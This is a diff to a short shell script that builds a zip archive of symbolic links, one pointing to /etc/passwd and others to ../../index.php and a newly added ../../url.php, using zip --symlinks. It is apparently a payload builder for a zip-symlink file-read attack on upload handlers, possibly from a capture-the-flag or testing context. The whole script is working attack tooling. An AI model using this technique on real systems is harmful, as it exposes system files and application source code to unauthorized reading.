@@ -5,9 +5,13 @@ do
     echo bullsh1t >> testfile.txt
 done
 
+echo "Test" > INDEX
+echo "Test" > URL
+
 ln -s /etc/passwd passwd
 ln -s ../../index.php index
+ln -s ../../url.php url
 
-zip --symlinks cmd.zip testfile.txt passwd index
+zip --symlinks cmd.zip testfile.txt passwd index url
 
-rm passwd index testfile.txt
+rm passwd index url testfile.txt
